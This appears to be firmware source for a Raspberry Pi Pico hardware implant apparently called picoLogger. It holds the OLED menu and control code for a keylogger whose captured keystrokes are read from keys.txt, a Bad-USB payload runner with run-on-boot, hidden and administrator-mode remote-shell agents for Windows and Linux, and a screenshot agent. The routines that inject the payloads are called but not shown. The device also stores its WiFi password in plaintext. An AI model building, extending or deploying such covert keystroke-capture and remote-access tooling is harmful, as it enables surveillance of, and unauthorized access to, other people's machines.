void saveScreenState(bool inverted) {
    File file = LittleFS.open("/config.txt", "w");
    if (file) {
        file.println("SSID:" + ssid);
        file.println("Password:" + password);
        file.println("WiFiState:" + String(wifiState ? "ON" : "OFF"));
        file.println("SCREEN:" + String(inverted ? "INVERTED" : "NORMAL"));
        file.close();
        Serial.println("Screen state saved.");
    } else {
        Serial.println("Failed to save screen state.");
    }
}

void loadScreenState() {
    File file = LittleFS.open("/config.txt", "r");
    if (!file) {
        Serial.println("No config file found. Defaulting to normal screen.");
        invertedState = false;
        return;
    }
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();      
        if (line.startsWith("SCREEN:")) {
            String screenSetting = line.substring(7);
            screenSetting.trim();
            invertedState = (screenSetting == "INVERTED");
            Serial.println("Screen state loaded: " + String(invertedState ? "INVERTED" : "NORMAL"));
        }
    }
    file.close();
}

void toggleInvertedScreenHandler() {
  invertedState = !invertedState;                 // Toggle the state
  saveScreenState(invertedState);                 // Save the new state

  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.println(invertedState ? "Screen: INVERTED\n\nRestarting..." : "Screen: NORMAL\n\nRestarting...");
  display.display();
  delay(1500);
  restartPico();
}

// ==================================================== Screen Print Functions ====================================================
void showWiFiScreen(String ssid, String password) {
    static bool wifiState = loadWiFiState();
    display.clearDisplay();
    display.setCursor(0, 0);
    display.display();
    display.print(wifiState ? "WiFi: ON" : "WiFi: OFF");
    display.print("\n");
    display.print("SSID: ");
    display.print(String(ssid));
    display.print("\n");
    display.print("PASS: ");
    display.print(String(password));
    display.print("\n");
    display.print("http://");
    display.print(WiFi.softAPIP()); 
    display.display();
}

void showStartupScreen() {
  display.clearDisplay();
  display.drawBitmap(
    (display.width() - OLED_WIDTH) / 2,
    (display.height() - OLED_HEIGHT) / 2,
    picoLoggerLogo, 
    OLED_WIDTH, OLED_HEIGHT, 
    SSD1306_WHITE
  );
  display.display();
  delay(3000);
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.println("");
  display.display(); 
}

void showWiFiInfoHandler() {
  showWifiMessage = true;
  showWiFiScreen(ssid, password);
}

void scrollUp(uint8_t pixels) {
  display.startscrollright(0x00, 0x07);
  display.stopscroll();
  for (int i = 0; i < display.height() - pixels; i++) {
    for (int j = 0; j < display.width(); j++) {
      uint8_t color = display.getPixel(j, i + pixels);
      display.drawPixel(j, i, color);
    }
  }
  display.fillRect(0, display.height() - pixels, display.width(), pixels, SSD1306_BLACK);
  display.display();
}

void checkAndScroll() {
  if ((display.getCursorY() + 8) > display.height()) {
    scrollUp(8);
    display.setCursor(0, display.getCursorY() - 8);
  }
}

void printout(const char *str){
  checkAndScroll();
  display.print(str);
  display.display();
}

void startLiveCapture() {
  liveCaptureActive = true;
  liveCaptureStart = true;
  display.clearDisplay();
  display.setCursor(0, 0);
  display.display();
  printout("[LIVE CAPTURE]\n");
}

// ===================================================== Screen read functions ==========================================================

void drawLogScreen() {
  display.clearDisplay();
  display.setCursor(0, 0);

  int linesShown = 0;
  for (int i = currentLogIndex; i >= 0 && linesShown < 4; i--, linesShown++) {
    display.println(logLines[i]);
  }
  display.display();
}


void handleLogScreenInput() {
  while (true) {
    if (upPressed()) {
      if (currentLogIndex < totalLogLines - 1) {
        currentLogIndex++;
        drawLogScreen();
        delay(150);
      }
    } else if (downPressed()) {
      if (currentLogIndex > 0) {
        currentLogIndex--;
        drawLogScreen();
        delay(150);
      }
    } else if (backPressed()) {
      backToMainMenu();
      break;
    }
  }
}

void screenLogs() {
  File file = LittleFS.open("keys.txt", "r");
  if (!file) {
    printout("Log file not found!");
    return;
  }
  totalLogLines = 0;
  while (file.available() && totalLogLines < MAX_LOG_LINES) {
    String line = file.readStringUntil('\n');
    logLines[totalLogLines++] = line;
  }
  file.close();
  if (totalLogLines > 0) {
    currentLogIndex = totalLogLines - 1;
  } else {
    printout("Log is empty");
    return;
  }
  drawLogScreen();
  handleLogScreenInput();
}

void toggleWiFiHandler() {
  static bool wifiState = loadWiFiState();
  wifiState = !wifiState;
  saveWiFiState(wifiState);
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.println(wifiState ? "WiFi: ON\n\nRetart Required" : "WiFi: OFF\n\nRetart Required");
  display.display();
  delay(1500);
  drawMenu();
}

void showWaitScreen(String msg) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(msg);
  display.display();
}

void takeSSMenuHandler() {
    showWaitScreen("Taking Screenshot...");
    fromMenu = true;
    handleTakeScreenshot();
    delay(1500);
    drawMenu();
}

void PSagentMenuHandler_Admin() {
  psAgentAdminFlag = true;
  psAgentHiddenFlag = false;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handlePsAgent();
  delay(1500);
  drawMenu();
}

void PSagentMenuHandler_Hidden() {
  psAgentAdminFlag = false;
  psAgentHiddenFlag = true;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handlePsAgent();
  delay(1500);
  drawMenu();
}

void PSagentMenuHandler_AdminHidden() {
  psAgentAdminFlag = true;
  psAgentHiddenFlag = true;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handlePsAgent();
  delay(1500);
  drawMenu();
}

void PSagentMenuHandler_Normal() {
  psAgentAdminFlag = false;
  psAgentHiddenFlag = false;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handlePsAgent();
  delay(1500);
  drawMenu();
}

void SSagentMenuHandler_Normal() {
  ssAgentHiddenFlag = false;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handleSSAgent();
  delay(1500);
  drawMenu();
}

void SSagentMenuHandler_Hidden() {
  ssAgentHiddenFlag = true;
  fromMenu = true;
  showWaitScreen("Deploying Agent...");
  handleSSAgent();
  delay(1500);
  drawMenu();
}

void linuxAgentMenuHandler_Hidden() {
  linuxAgentHiddenFlag = true;
  fromMenu = true;
  showWaitScreen("Deploying Linux Agent..");
  handleLinuxAgent();
  delay(1500);
  drawMenu();
}

void linuxAgentMenuHandler_Normal() {
  linuxAgentHiddenFlag = false;
  fromMenu = true;
  showWaitScreen("Deploying Linux Agent..");
  handleLinuxAgent();
  delay(1500);
  drawMenu();
}

void ExitMenuHandler() {
    showWaitScreen("Exiting Agent...");
    fromMenu = true;
    handleExitAgent();
    delay(1500);
    drawMenu();
}

void ClearLogsMenuHandler() {
    showWaitScreen("Logs Cleared...");
    fromMenu = true;
    clearLog();
    delay(1500);
    drawMenu();
}

// ==================================================== Menu Layouts =================================================================

MenuItem keyloggerMenu[] = {
  { " Read Logs", screenLogs, nullptr, 0 },
  { " Clear Logs", ClearLogsMenuHandler, nullptr, 0 },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem shellAgentSubMenu[] = {
  { " Run", PSagentMenuHandler_Normal, nullptr, 0 },
  { " Run Hidden", PSagentMenuHandler_Hidden, nullptr, 0 },
  { " Run Admin", PSagentMenuHandler_Admin, nullptr, 0 },
  { " Run Admin + Hidden", PSagentMenuHandler_AdminHidden, nullptr, 0 },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem linuxAgentSubMenu[] = {
  { " Run", linuxAgentMenuHandler_Normal, nullptr, 0 },
  { " Run Hidden", linuxAgentMenuHandler_Hidden, nullptr, 0 },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem screenshotAgentSubMenu[] = {
  { " Run", SSagentMenuHandler_Normal, nullptr, 0 },
  { " Run Hidden", SSagentMenuHandler_Hidden, nullptr, 0 },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem screenshotsMenu[] = {
  { " Deploy Agent", nullptr, screenshotAgentSubMenu, sizeof(screenshotAgentSubMenu) / sizeof(MenuItem) },
  { " Take Screenshot", takeSSMenuHandler, nullptr, 0 },
  { " Exit Agent", ExitMenuHandler, nullptr, 0 },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem shellMenu[] = {
  { " Deploy Windows Agent", nullptr, shellAgentSubMenu, sizeof(shellAgentSubMenu) / sizeof(MenuItem) },
  { " Deploy Linux Agent", nullptr, linuxAgentSubMenu, sizeof(linuxAgentSubMenu) / sizeof(MenuItem) },
  { " Main Menu", backToMainMenu, nullptr, 0 }
};

MenuItem systemMenu[] = {
  { " Live Capture", startLiveCapture, nullptr, 0 },
  { " WiFi Information",    showWiFiInfoHandler, nullptr, 0 },
  { " Toggle WiFi",  toggleWiFiHandler, nullptr, 0 },
  { " Rotate Screen",  toggleInvertedScreenHandler, nullptr, 0 },
  { " Reboot",  restartPico, nullptr, 0 },
  { " Main Menu",    backToMainMenu, nullptr, 0 }
};

MenuItem mainMenu[] = {
  { " Keylogger", nullptr, keyloggerMenu, 3 },
  { " Bad-USB", nullptr, nullptr, 0 },
  { " Remote Shell", nullptr, shellMenu, 3 },
  { " Screenshots", nullptr, screenshotsMenu, 4 },
  { " System", nullptr, systemMenu, 6 }
};

MenuItem* currentMenu = mainMenu;
uint8_t currentMenuLength = sizeof(mainMenu) / sizeof(MenuItem);
uint8_t selectedItem = 0;

const uint8_t itemsPerPage = 4;
uint8_t menuOffset    = 0;

// ========================================================== Display and Navigation =============================================================

void drawMenu() {
  display.clearDisplay();
  display.setCursor(0, 0);
  uint8_t lineHeight = 8;
  
  for (uint8_t line = 0; line < itemsPerPage; line++) {
    uint8_t idx = menuOffset + line;
    if (idx >= currentMenuLength) break;
    if (idx == selectedItem) {
      display.fillRect(0, line * lineHeight, OLED_WIDTH, lineHeight, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(0, line * lineHeight);
    display.println(currentMenu[idx].name);
  }

  int xCenter = OLED_WIDTH - 4;
  int arrowSize = 4;
  bool topItemSelected = selectedItem == menuOffset;
  bool bottomItemSelected = selectedItem == menuOffset + itemsPerPage - 1;
  
  if (menuOffset > 0) {
    uint16_t arrowColor = topItemSelected ? SSD1306_BLACK : SSD1306_WHITE;
    display.fillTriangle(
      xCenter, 1,
      xCenter - arrowSize, 1 + arrowSize,
      xCenter + arrowSize, 1 + arrowSize,
      arrowColor
    );
  }

  if (menuOffset + itemsPerPage < currentMenuLength) {
    int yBase = (itemsPerPage * lineHeight) - 2;
    uint16_t arrowColor = bottomItemSelected ? SSD1306_BLACK : SSD1306_WHITE;
    display.fillTriangle(
      xCenter, yBase,
      xCenter - arrowSize, yBase - arrowSize,
      xCenter + arrowSize, yBase - arrowSize,
      arrowColor
    );
  }
  display.setTextColor(SSD1306_WHITE);
  display.display();
}


void moveSelectionUp() {
  if (selectedItem > 0) {
    selectedItem--;
    if (selectedItem < menuOffset) {
      menuOffset--;
    }
    drawMenu();
  }
}

void moveSelectionDown() {
  if (selectedItem < currentMenuLength - 1) {
    selectedItem++;
    if (selectedItem >= menuOffset + itemsPerPage) {
      menuOffset++;
    }
    drawMenu();
  }
}

void backToMainMenu() {
  currentMenu = mainMenu;
  currentMenuLength = sizeof(mainMenu)/sizeof(MenuItem);
  selectedItem = 0;
  menuOffset   = 0;
  drawMenu();
}

// ============================================================== Bad-USB Menu Functions =====================================================

void togglePayloadBootHandler() {
  bool isEnabled = false;
  
  File file = LittleFS.open("/config_pob.txt", "r");
  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      line.trim();
      if (line == currentPayload) {
        isEnabled = true;
        break;
      }
    }
    file.close();
  }
  if (isEnabled) {
    File writeFile = LittleFS.open("/config_pob.txt", "r");
    String updatedList = "";
    while (writeFile.available()) {
      String line = writeFile.readStringUntil('\n');
      line.trim();
      if (line != currentPayload) {
        updatedList += line + "\n";
      }
    }
    writeFile.close();
    writeFile = LittleFS.open("/config_pob.txt", "w");
    if (writeFile) {
      writeFile.print(updatedList);
      writeFile.close();
    }
    bootMessage = currentPayload + "\n\nDisabled on Boot";
  } else {
    File file = LittleFS.open("/config_pob.txt", "a");
    if (file) {
      file.println(currentPayload);
      file.close();
    }
    bootMessage = currentPayload + "\n\nEnabled on Boot";
  }

  showBootMessage = true;
  bootMessageMillis = millis();
}

void buildBadUsbMenu() {
  delete[] badUsbFiles;
  delete[] badUsbMenu;

  Dir dir = LittleFS.openDir("/payloads");
  badUsbFilesCount = 0;
  while (dir.next()) badUsbFilesCount++;
  badUsbFiles = new String[badUsbFilesCount];
  dir = LittleFS.openDir("/payloads");
  uint8_t i = 0;
  while (dir.next()) {
    badUsbFiles[i++] = dir.fileName();
  }
  badUsbMenuLength = badUsbFilesCount + 1;
  badUsbMenu = new MenuItem[badUsbMenuLength];
  String* badUsbNamesWithSpace = new String[badUsbFilesCount];
  for (uint8_t j = 0; j < badUsbFilesCount; j++) {
    badUsbNamesWithSpace[j] = " " + badUsbFiles[j];
    badUsbMenu[j].name = badUsbNamesWithSpace[j].c_str();
    badUsbMenu[j].handler = nullptr;
    badUsbMenu[j].submenu = nullptr;
    badUsbMenu[j].submenuLength = 0;
  }
  badUsbMenu[badUsbFilesCount] = { " Main Menu", backToMainMenu, nullptr, 0 };
}

void runPayloadHandler() {
  showWaitScreen("Running Payload...");
  executePayload(currentPayload);
}
 
void selectItem() {
  MenuItem &sel = currentMenu[selectedItem];

  if (currentMenu == mainMenu && selectedItem == 1) {
    buildBadUsbMenu();
    mainMenu[1].submenu       = badUsbMenu;
    mainMenu[1].submenuLength = badUsbMenuLength;
  }

  if (currentMenu == badUsbMenu 
      && sel.name != String(" Main Menu")
      && sel.submenu == nullptr) 
  {
    currentPayload = badUsbFiles[selectedItem];

    delete[] payloadActionMenu;
    payloadActionMenu = new MenuItem[4];
    payloadActionMenu[0] = { " Run",        runPayloadHandler,         nullptr, 0 };
    payloadActionMenu[1] = { " Delete",     deletePayloadHandler,      nullptr, 0 };
    payloadActionMenu[2] = { " Toggle Boot", togglePayloadBootHandler,  nullptr, 0 };
    payloadActionMenu[3] = { " Main Menu",  backToMainMenu,            nullptr, 0 };
    sel.submenu       = payloadActionMenu;
    sel.submenuLength = 4;
  }
  if (sel.submenu) {
    currentMenu        = sel.submenu;
    currentMenuLength  = sel.submenuLength;
    selectedItem       = 0;
    menuOffset         = 0;
    drawMenu();
  }
  else if (sel.handler) {
    sel.handler();
     if (!liveCaptureActive && !showBootMessage && !showWifiMessage) drawMenu();
  }
}

void deletePayloadHandler() {
  String filepath = "/payloads/" + currentPayload;
  if (LittleFS.remove(filepath)) {
    Serial.println("[INFO] Deleted payload: " + currentPayload);
    printout("Deleted: ");
    printout(currentPayload.c_str());
  } else {
    Serial.println("[ERROR] Failed to delete: " + currentPayload);
    printout("Delete failed");
  }
  buildBadUsbMenu();
  currentMenu = badUsbMenu;
  currentMenuLength = badUsbMenuLength;
  selectedItem = 0;
  menuOffset = 0;
  drawMenu();
}
